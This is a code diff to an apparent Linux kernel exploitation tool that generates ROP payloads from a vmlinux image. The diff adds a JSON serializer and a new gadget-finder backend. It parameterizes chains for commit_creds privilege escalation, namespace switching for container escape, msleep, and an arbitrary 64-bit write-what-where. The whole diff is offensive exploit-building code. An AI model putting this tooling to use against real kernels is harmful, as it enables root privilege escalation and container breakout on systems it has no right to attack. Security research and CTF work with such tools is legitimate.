@@ -15,6 +15,7 @@ from rop_ret_patcher import patch_vmlinux_return_thunk
 from rop_util import load_symbols, setup_logger
 import gadget_finder
 from gadget_filter import GadgetFilter
+from rop_action_serializer import RopActionSerializer
 
 BIT_SIZE = 64
 PREPARE_KERNEL_CRED = "prepare_kernel_cred"
@@ -27,6 +28,7 @@ INIT_NSPROXY = "init_nsproxy"
 CORE_PATTERN = "core_pattern"
 MSLEEP = "msleep"
 FORK = "__do_sys_vfork"
+RPP_CONTEXT_SIZE = 5
 
 ROP_C_FORMAT = "*(rop++) = {};"
 ROP_REBASE_C_FORMAT = "*(rop++) = kbase + {};"
@@ -99,7 +101,8 @@ class RopGeneratorAngrop:
 
         This is done to avoid the slowness of analyzing the entire kernel binary with angrop
         """
-        possible_gadgets = gadget_finder.find_gadgets(self._vmlinux_path, 5)
+        rop_backend = gadget_finder.RppBackend(self._vmlinux_path, RPP_CONTEXT_SIZE)
+        possible_gadgets = gadget_finder.find_gadgets(rop_backend)
         logger.debug("gadgets before filter: %d", len(possible_gadgets))
         gadget_filter = GadgetFilter()
         possible_gadgets = gadget_filter.filter_gadgets(possible_gadgets)
@@ -381,25 +384,39 @@ if __name__ == "__main__":
         description="Generates ROP payloads for linux kernel images"
     )
     parser.add_argument("vmlinux_path", help="Path to vmlinux file")
+    parser.add_argument("--output", choices=["python", "json"], default="python")
+    parser.add_argument("--json-indent", type=int, default=None)
     args = parser.parse_args()
+
     patched_vmlinux_path = pathlib.Path(
         args.vmlinux_path
     ).with_suffix(".thunk_replaced")
+
     if not patched_vmlinux_path.exists():
         patch_vmlinux_return_thunk(args.vmlinux_path, patched_vmlinux_path)
+
     rop_generator = RopGeneratorAngrop(patched_vmlinux_path)
-    chain = rop_generator.build_rop_chain()
-    payload_code = rop_generator.payload_c_code(chain)
-    print(payload_code)
-    print("\n")
     action_sleep = rop_generator.rop_action_msleep(RopChainArgument(0))
-    print("sleep\n" + repr(action_sleep) + '\n\n')
     action_commit_creds = rop_generator.rop_action_commit_creds()
-    print("Commit Creds\n" + repr(action_commit_creds) + '\n\n')
-    action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces(RopChainConstant(1))
-    print("Switch task Namepspace\n" +
-          repr(action_switch_task_namespace) + '\n\n')
+    action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces(RopChainArgument(0))
     action_write_what_where_64 = rop_generator.rop_action_write_what_where_64(
-        RopChainConstant(0x414141414141), RopChainConstant(5678))
-    print("Write What Where (64 bits)\n" +
-          repr(action_write_what_where_64) + '\n\n')
+        RopChainArgument(0), RopChainArgument(1))
+
+    if args.output == "json":
+        print(RopActionSerializer.serialize({
+            0x01: action_sleep,
+            0x02: action_commit_creds,
+            0x03: action_switch_task_namespace,
+            0x04: action_write_what_where_64
+        }, args.json_indent))
+    else:
+        chain = rop_generator.build_rop_chain()
+        payload_code = rop_generator.payload_c_code(chain)
+        print(payload_code)
+        print("\n")
+        print("sleep\n" + repr(action_sleep) + '\n\n')
+        print("Commit Creds\n" + repr(action_commit_creds) + '\n\n')
+        print("Switch task Namepspace\n" +
+              repr(action_switch_task_namespace) + '\n\n')
+        print("Write What Where (64 bits)\n" +
+              repr(action_write_what_where_64) + '\n\n')
